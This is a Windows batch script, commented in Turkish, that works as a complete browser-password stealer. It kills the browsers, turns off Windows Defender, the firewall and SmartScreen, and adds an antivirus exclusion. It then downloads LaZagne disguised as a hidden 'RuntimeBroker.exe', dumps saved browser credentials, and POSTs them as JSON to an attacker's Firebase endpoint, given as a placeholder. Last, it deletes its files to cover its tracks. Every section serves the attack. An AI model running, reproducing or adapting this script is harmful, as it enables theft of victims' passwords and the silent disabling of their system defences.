@echo off
:: Yönetici kontrolü
net session >nul 2>&1
if %ERRORLEVEL% neq 0 (
    echo [+] Bu scriptin çalışması için yönetici izni gerekiyor!
    echo Lütfen scripti yönetici olarak çalıştırın.
    pause
    exit
)

:: Çıkış kodlarını saklamak için geçici dosya
set LOGFILE=%TEMP%\script_log.txt
echo [%DATE% %TIME%] Script başlatıldı > "%LOGFILE%"

:: Chrome ve Edge işlemlerini kapat
echo [%DATE% %TIME%] Tarayıcılar kapatılıyor... >> "%LOGFILE%"
taskkill /F /IM chrome.exe >nul 2>&1
taskkill /F /IM msedge.exe >nul 2>&1

:: Windows Defender kapatma
echo [%DATE% %TIME%] Windows Defender kapatılıyor... >> "%LOGFILE%"
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableScriptScanning $true -DisableArchiveScanning $true -DisableCatchupFullScan $true -DisableCatchupQuickScan $true" >nul 2>&1
powershell -Command "Stop-Service -Name WinDefend -Force" >nul 2>&1
powershell -Command "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'DisableAntiSpyware' -Value 1 -Type DWord -Force" >nul 2>&1
powershell -Command "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection' -Name 'DisableBehaviorMonitoring' -Value 1 -Type DWord -Force" >nul 2>&1

:: Windows Firewall kapatma
echo [%DATE% %TIME%] Windows Firewall kapatılıyor... >> "%LOGFILE%"
powershell -Command "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False" >nul 2>&1

:: Windows SmartScreen kapatma
echo [%DATE% %TIME%] Windows SmartScreen kapatılıyor... >> "%LOGFILE%"
powershell -Command "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\System' -Name 'EnableSmartScreen' -Value 0 -Type DWord -Force" >nul 2>&1
powershell -Command "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer' -Name 'SmartScreenEnabled' -Value 'Off' -Type String -Force" >nul 2>&1
powershell -Command "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\MicrosoftEdge\PhishingFilter' -Name 'EnabledV9' -Value 0 -Type DWord -Force" >nul 2>&1

:: Defender исключение ekleme (RuntimeBroker.exe için)
echo [%DATE% %TIME%] Defender için RuntimeBroker.exe исключение ekleniyor... >> "%LOGFILE%"
powershell -Command "Add-MpPreference -ExclusionPath '%TEMP%' -ExclusionProcess 'RuntimeBroker.exe'" >nul 2>&1

cd /d %TEMP%
echo [%DATE% %TIME%] Çalışma dizini: %CD% >> "%LOGFILE%"

:: Önce varsa eski dosyaları sil
if exist RuntimeBroker.exe (
    echo [%DATE% %TIME%] Eski RuntimeBroker.exe siliniyor... >> "%LOGFILE%"
    del /f /q RuntimeBroker.exe >nul 2>&1
)
if exist results (
    echo [%DATE% %TIME%] Eski results klasörü siliniyor... >> "%LOGFILE%"
    rd /s /q results >nul 2>&1
)

:: Lazagne indir (önce curl, sonra PowerShell fallback)
echo [%DATE% %TIME%] Lazagne indiriliyor (curl ile)... >> "%LOGFILE%"
curl -L -o RuntimeBroker.exe https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe >nul 2>&1
if %ERRORLEVEL% neq 0 (
    echo [%DATE% %TIME%] HATA: Curl indirme başarısız, PowerShell ile deneniyor... >> "%LOGFILE%"
    powershell -Command "try { Invoke-WebRequest -Uri 'https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe' -OutFile 'RuntimeBroker.exe' } catch { Write-Output ('HATA: PowerShell indirme başarısız: ' + $_.Exception.Message) | Out-File -FilePath '%LOGFILE%' -Append }" >nul 2>&1
    if %ERRORLEVEL% neq 0 (
        echo [%DATE% %TIME%] HATA: PowerShell indirme de başarısız! >> "%LOGFILE%"
        echo [+] Lazagne indirilemedi, lütfen internet bağlantısını veya antivirüsü kontrol edin.
        goto :cleanup
    )
)

:: Dosyanın varlığını ve boyutunu kontrol et
if exist RuntimeBroker.exe (
    for %%F in (RuntimeBroker.exe) do (
        if %%~zF LSS 1000 (
            echo [%DATE% %TIME%] HATA: RuntimeBroker.exe bozuk veya boş (%%~zF bayt)! >> "%LOGFILE%"
            del /f /q RuntimeBroker.exe >nul 2>&1
            echo [+] Lazagne dosyası bozuk, lütfen tekrar deneyin.
            goto :cleanup
        )
    )
    echo [%DATE% %TIME%] RuntimeBroker.exe başarıyla indirildi. >> "%LOGFILE%"
) else (
    echo [%DATE% %TIME%] HATA: RuntimeBroker.exe indirilemedi! >> "%LOGFILE%"
    echo [+] Lazagne indirilemedi, lütfen internet bağlantısını veya antivirüsü kontrol edin.
    goto :cleanup
)

attrib +h RuntimeBroker.exe
echo [%DATE% %TIME%] RuntimeBroker.exe gizlendi >> "%LOGFILE%"

:: Lazagne ile şifreleri topla
echo [%DATE% %TIME%] Şifreler toplanıyor... >> "%LOGFILE%"
RuntimeBroker.exe browsers -oN -output results >nul 2>&1
if %ERRORLEVEL% neq 0 (
    echo [%DATE% %TIME%] HATA: Lazagne çalıştırılamadı! >> "%LOGFILE%"
    set DATA=NoDataCollected
    goto :send_to_firebase
)

:: Firebase'e veri gönderme için data hazırla
set LOGFILE=results\browsers.txt
set DATA=

if exist "%LOGFILE%" (
    echo [%DATE% %TIME%] browsers.txt bulundu, işleniyor... >> "%LOGFILE%"
    setlocal EnableDelayedExpansion
    for /f "usebackq delims=" %%A in ("%LOGFILE%") do (
        set "line=%%A"
        :: JSON için güvenli kaçış: \, ", ve kontrol karakterlerini değiştir
        set "line=!line:\=\\!"
        set "line=!line:"=\\\"!"
        set "line=!line:^|=\\|!"
        set "line=!line:^&=\\&!"
        set "line=!line:^^=\\^!"
        :: Yeni satırları \n ile değiştir
        set "line=!line:
=\\n!"
        set "DATA=!DATA!!line!\\n"
    )
    endlocal & set DATA=%DATA%
) else (
    echo [%DATE% %TIME%] HATA: browsers.txt bulunamadı! >> "%LOGFILE%"
    set DATA=NoDataCollected
)

:: Firebase URL (Kendi Firebase URL'ni buraya ekle)
set FB=https://YOUR_FIREBASE_URL_HERE/credentialsa.json
echo [%DATE% %TIME%] Firebase URL: %FB% >> "%LOGFILE%"

:: Powershell ile JSON gönderme
echo [%DATE% %TIME%] Firebase'e veri gönderiliyor... >> "%LOGFILE%"
powershell -Command ^
  "try { $json = '{\"log\":\"%DATA%\"}' -replace '[\x00-\x1F\x7F]', ''; Invoke-RestMethod -Uri '%FB%' -Method POST -Body $json -ContentType 'application/json' } catch { Write-Output ('HATA: Firebase gönderim başarısız: ' + $_.Exception.Message) | Out-File -FilePath '%LOGFILE%' -Append }" >nul 2>&1
if %ERRORLEVEL% neq 0 (
    echo [%DATE% %TIME%] HATA: Powershell Firebase gönderimi başarısız! >> "%LOGFILE%"
)

:: Temizlik
:cleanup
echo [%DATE% %TIME%] Temizlik yapılıyor... >> "%LOGFILE%"
if exist RuntimeBroker.exe del /f /q RuntimeBroker.exe >nul 2>&1
if exist results rd /s /q results >nul 2>&1

echo [%DATE% %TIME%] İşlem tamamlandı, çıkılıyor... >> "%LOGFILE%"
echo [+] İşlem tamamlandı, çıkılıyor...
timeout /t 3 >nul

:: Hata ayıklama için log dosyasını göster
:: type "%LOGFILE%"
exit
